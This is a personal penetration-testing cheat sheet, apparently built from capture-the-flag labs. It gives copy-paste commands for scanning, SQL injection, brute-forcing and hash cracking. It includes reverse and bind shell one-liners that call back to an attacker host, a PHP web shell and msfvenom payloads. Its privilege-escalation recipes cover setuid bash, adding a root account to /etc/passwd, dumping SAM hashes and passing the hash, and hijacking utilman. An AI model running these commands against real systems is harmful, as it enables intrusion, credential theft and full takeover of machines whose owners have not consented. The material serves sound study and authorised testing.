# Scanning
## nmap
scan - standard ports, standard scripts, enumerate versions, output to file
```
nmap -sC -sV -oN <output_filename> <ip>
```

scan - all ports, output to file
```
nmap -p- -oN <output_file> <ip>
```

## gobuster
directory scanning - common wordlist is directory-list-2.3-medium.txt from kali
```
gobuster dir -u <url> -w <wordlist>
```

# Injection
## sqlmap
basic sqlmap run, looking for data params in the --data argument
```
sqlmap -u <url> --data 'a=aa&b=bbb'
```

enumerate databases, --batch for no questions
```
sqlmap -u <url> --data 'a=aaa&b=bbb' --batch --dbs
```

enumerate tables
```
sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> --tables
```

enumerate columns
```
sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> -T <table> --columns
```

dump to stdin
```
sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> -T <table> --dump
```

# Cracking

A common file to use for cracking is `rockyou.txt`

## Hydra
Bruteforcing SSH Passwords
```
hydra -l <username> -P <path to wordlist> <IP> ssh
```

Bruteforcing SSH Username
```
hydra -L <path to wordlist> -p <password> <IP> ssh
```

Bruteforcing SSH Both
```
hydra -L <path to username wordlist> -P <path to password wordlist> <IP> ssh
```

Bruteforcing Web
```
hydra -l admin -P ~/rockyou.txt 10.10.173.237 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

## John the ripper
common list to use is rockyou.txt

basic crack:
```
john <input file> --wordlist=<wordlist>
```
For more info see [john-the-ripper.md](tools/john-the-ripper.md)

## Hashcat
-Understand the hash you're cracking, if from shadow then use https://linuxize.com/post/etc-shadow-file/

- Put hash in file, e.g. hashes.txt
- for a SHA512 hash (starts $6$) using the rockyou.txt file:
```
hashcat -m 1800 -a 0 hashes.txt ~/Downloads/rockyou.txt
```
Look up the `-m` param at https://hashcat.net/wiki/doku.php?id=example_hashes

## Crackstation
Useful site for testing against lookup tables
[crackstation.net](https://crackstation.net)
 
# Web
- view source looking for comments
- try sql injection in logins (try usernames / passwords)
    - OR 1=1 #
    - OR 1=1 --
    - ' (to see if it errors)
    - sqlmap

## Upload Bypass
Try
  - Changing the file extension (e.g. from .php to .php5)
  - Changing the mime type via burp
  - Hex editing the file to change the first few bytes

# Reverse Shells
The target is forced to execute code that connects back to your computer
i.e. local listens, target connects

Get shells from 
- [revshells.com](https://revshells.com)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
- On Kali go to `/usr/share/webshells`

Get local ip address when on VPN
```
ip a s tun0
```

listen on local host
```
nc -lnvp <port>
```

## Very simple reverse shell
```
bash -i >& /dev/tcp/<local ip>/<local port> 0>&1
```
then local machine
```
nc -nlvp <port>
```

## Netcat
Set up listener
```
sudo nc -lvnp 443
```

On the target
```
nc <Local_IP> <Port> -e /bin/bash
```

To create a listener for a reverse shell (above might not be available in all nc distros):
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

## Shell stabilisation
These work for both reverse and bind shells

### Python
Requires python installed on the target box.  Linux usually has this by default

1. `python -c 'import pty;pty.spawn("/bin/bash")'` - spawn a better featured shell (might need `python3` at the start)
2. `export TERM=xterm` - give access to commands list `clear`
3. `CTRL-Z` then `stty raw -echo; fg` - Ctrl-z to background the shell, turn off our own terminal echo, then fg the shell.  This gives us things like auto complete, arrow keys, CTRL-C to kill the process without killing the shell etc

If the shell dies then type `reset` to get local echo back

### rlwrap
This needs to be installed locally then when starting the listener
`rlwrap nc -lvnp <port>`

Useful for windows targets.  For linux step 3 of the Python option above is another option

### socat
This only works in Linux targets

Need to transfer a [socat static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target.  One way to do this is to start a web server locally `sudo python3 -m http.server 80` then on the target machine download the file `wget <LOCAL-IP>/socat -O /tmp/socat`

To create a reverse shell
(connects a listening port and standard input)
```
socat TCP-L:<port> -
```

For a more stable shell use socat with tty
```
socat TCP-l:<port> FILE:`tty`,raw,echo=0
```
then activate with
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

To use an encrypted shell:
Generate pem:
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```
Set up shell:
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
Then connect from attacking machine:
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### terminal tty size
Match the tty size of the remote shell - can help with things like text editors

in a new local terminal `stty -a` and note down the rows and cols
then in the remote shell
`stty rows <number>`
`stty cols <number>`

# Bind Shell
The code executed on the target is used to start a listener attached to a shell directly on the target
i.e. target listens, local connects

## Netcat
On the target 
`nc -lvnp <port> -e "cmd.exe"`

On the attacking (local) machine
`nc <Machine_IP> <port>`

To create a listener for a bind shell (above might not be available in all nc distros):
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

## socat
on the target
`socat TCP-L:<port> EXEC:"bash -li"`

On the attacking machine
`socat TCP:<target-ip>:<target-port> -`

Encrypted shell (follow the steps in bind shell notes to create pem file)
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Then on the attacking machine
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

# Local security bypass
if you can get root to run a script (i.e. through a cron job)
then consider setting bash as setuid so it runs as root
```
chmod +s /bin/bash
```
then when it's it's setuid set (`ls -l /bin/bash`)
(-p stops the effective user id from being set)
```
/bin/bash -p
```

# Payload generation
## msfvenom
Part of metasploit

Generate payloads with
```
msfvenom -p <payload> <options>
```

For example, to generate a Windows x64 Reverse Shell in an exe format

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

2 types of reverse shell payloads
- staged - come in 2 parts, the first sets up a listener, then loads the second part which is the actual payload.  Can avoid AV as the reverse shell is never loaded to disk
- stageless - all-in-one payload which contains both the listener and the full payload


In metasploit payloads are generally listed as `<os>/<arch>/<payload>` e.g. `linux/x86/shell_reverse_tcp`

To list payloads `msfvenom --list payloads`

## web payloads
simple PHP
```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
Then you can use the `cmd` get param to specify a command to run e.g. `http://blah.com/shell.php?cmd=ifconfig`

Lots in kali under `/usr/share/webshells`

# Where to look once you have access

## SSH
`/home/<user>/.ssh`

## Logins to crack
- `/etc/shadow`
- `/etc/passwd`

## Windows
look for FTP creds
- `C:\Program Files\FileZilla Server\FileZilla Server.xml`
- `C:\xampp\FileZilla Server\FileZilla Server.xml`

Create a new user
`net user <username> <password> /add`
`net localgroup administrators <username> /add`

# Privilege Escalation
## Linux
### Useful commands
- `hostname` - returns the machine name, sometimes contains useful indicators on the machine use
- `uname -a` - print info about the kernel, which might be unpatched
- `cat /proc/version` - provides info on system processes
- `cat /etc/issue` - Usually contains OS info
- `ps` - show processes in the current shell
- `ps -A` - show all processes
- `ps axjf` - show process tree
- `ps aux` - show processes for all users (a), user that launched it (u) and not attached to the terminal (x)
- `env` - show environment variables
- `sudo -l` - list what commands this user can sudo
- `ls` - browse the file system
- `cat /etc/passwd` - look at the users
- `cat /etc/passwd | cut -d ":" -f 1` - turn passwd file into list of users (brute force list)
- `history` - view any old commands
- `ifconfig` - list network details, may be able to pivot to another machine
- `ip route` - see what network routes exist
- `netstat -a` - see what's listening
- `netstat -at` - list TCP protocols (`-au` for UDP)
- `netstat -l` - list ports in listening mode
- `netstat -s` - list network usage stats
- `netstat -tp` - list connections with the service name and PID
- `netstat -i` - shows interface stats
- `netstat -ano` - display all sockets (a), don't resolve names (n) and display timers (o)
- `find . -name flag1.txt` - look for "flag1.txt" in the local dir (.)
- `find / -type d -name config` - find the directory named config under “/”
- `find / -type f -perm 0777` - find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x` - find executable files
- `find /home -user frank` - find all files for user “frank” under “/home”
- `find . -name flag1.txt -type f 2>/dev/null` - gives cleaner output
- `find / -writable -type d 2>/dev/null` - Find world-writeable folders
- `find / -perm -u=s -type f 2>/dev/null` - Find files with the SUID bit
- `find / -type f -perm -04000 -ls 2>/dev/null` - Find files with SUID or SGID
- `getcap -r / 2>/dev/null` - Find files with capabilities set

### Tools for enumeration
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

### Kernel CVEs
https://www.linuxkernelcves.com/cves
https://www.exploit-db.com/

### Sudo Exploits
`sudo -l` to see what you can run as root
https://gtfobins.github.io/ - shows you how to abuse it

If you see LD_PRELOAD then check out https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

### SUID/SGID
`find / -type f -perm -04000 -ls 2>/dev/null` - what has SUID/SGID set
https://gtfobins.github.io/#+suid - how to abuse it

### Local Accounts
If you can access /etc/shadow and /etc/passwd then either

#### Crack account
- Grab shadow and passwd
- use unshadow to create a crackable file `unshadow passwd.txt shadow.txt > passwords.txt`
- Use john the ripper to crack the passwords

#### Create new account
- Use openssl to hash a new password `openssl passed -1 -salt THM password1`
- Add this entry to /etc/passwd (including root access) `<username>:<hash>:0:0:root:/root:/bin/bash`
- then switch to that user `su <username>`

### Capabilities
Check for files with capabilities set
```
getcap -r / 2>/dev/null
```
Then look up against https://gtfobins.github.io/#+capabilities

### Cron Jobs
Check for system-wide cron jobs at /etc/crontab
```
cat /etc/crontab
```
Check if any run as root

### Less
if you can get into as root (e.g. through SUID) less then run
```
!bash
```

### PATH
Check if you have write permissions to a folder in PATH that you can exploit
```
echo $PATH
```
Check where's writable
```
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
You can then add this writable folder to the path (if it's not already in there) and then use a SUID binary to execute your code instead

### NFS
Check /etc/exports for shares that have no_root_squash set
This allows us to share a folder with a SUID binary set, and execute it on the server
example binary
```
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
The compile with gcc and `chmod +s <file>` the binary
On the attacking machine check the mounts on the target
```
showmount -e <target_ip>
mount -o rw <target_ip>:/<share> <local_folder>
```

## Windows
### Unattended Windows Installations
Windows deployment service allows image to be deployed to multiple hosts.  These can leave an admin account behind:
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
Powershell stores command history in a file.  From a cmd prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials
Windows allows you to save credentials, you can list them with:
```
cmdkey /list
```
You don't see the password, but any credentials can be used with `runas`:
```
runas /savecred /user:admin cmd.exe
```

### IIS Config
Connection string can be stored in the web config of sites
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

```

### Retrieve Credentials from Software: PuTTY
While putty wont store SSH creds, it does store proxy creds:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Scheduled Tasks
`schtasks` can be used to list scheduled tasks.  One of these may be running as an admin and running an exe that you can control.  `icacls <file_path>` will list the permissions on the exe.

### AlwaysInstallElevated
msi files can be set to run with highter privileges.  2 Reg values must be set:
- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

`msfvenom` can generate a malicious msi file:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.217.153 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Then run the MSI on the target with
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Windows Services
SCM manages windows services.`sc qc <service_name>` can be used to query a service.  Service config is also stored in the reg under HKLM\SYSTEM\CurrentControlSet\Services\  

Check if a service has weak permissions that allow an attacker to control the exe

You can create a reverse shell service on the attacking machine with:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
Then start a server with `python3 -m http.server` and use wget in powershell on the target to download it, then `icacls C:\MyPrograms\rev-svc2.exe /grant Everyone:F` to grant all users permissions to it.

### Unquoted Service Paths
There is an odd issue we can exploit where the service path isn't properly quoted to account for spaces.  For example if the path is `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` then we can jump in at the space and create `C:\MyPrograms\Disk.exe` and it'll take over (passing the rest of the path as arguments).

### Insecure Service Permissions
While the service exe DACL might be secure, the service itself might have an insecure setup.  Sysinternals `accesschk64.exe` will allow you to check what a service DACL is `accesschk64.exe -qlc thmservice`

You can then update anything insecure with `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem` to point to a poisoned bin.

### Windows Privileges
You can see what priv you have with `whoami /priv`.  You can look up how to abuse them at https://github.com/gtworek/Priv2Admin. A few examples.

#### SeBackup / SeRestore
Allows a user to read/write any file in the system ignoring DACL permissions.  One attack with this is to copy SAM and SYSTEM registry hives to extract the admin password.

Create the files:
```
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

Copy these to the attacker machine, maybe using smbserver.py:
```
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Then on the target copy them over
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Get password hashes:
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Then use a pass-the-hash attack:
```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 
```

#### SeTakeOwnership
Allows the user to take ownership of any file.  For example we could take over utilman and replace it with cmd.exe to give us an admin cmd from the lock screen.

Open an admin prompt then take ownership of utilman with `takeown /f C:\Windows\System32\Utilman.exe`.  Give yourself full perms `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F` then from system32 replace with cmd.exe `copy cmd.exe utilman.exe`.

Now on the lock screen click the "Ease of Access" button to get a shell.

### Abusing Vulnerable Software
Have a look around and see what's installed.  There might be old software we can loop up on https://www.exploit-db.com/ or https://packetstormsecurity.com/.  The command `wmic product get name,version,vendor` can be used to list installed software.

### Useful scripts
#### WinPEAS
Can enumerate a target system to uncover priv escalation paths. https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

#### PrivescCheck
Powershell script that looks for common priv esc routes.  https://github.com/itm4n/PrivescCheck

#### WES-NG: Windows Exploit Suggester - Next Generation
Runs on the attack machine instead of the target, avoids AV.  https://github.com/bitsadmin/wesng


# Log parsing

## Tools
- Chainsaw - https://github.com/countercept/chainsaw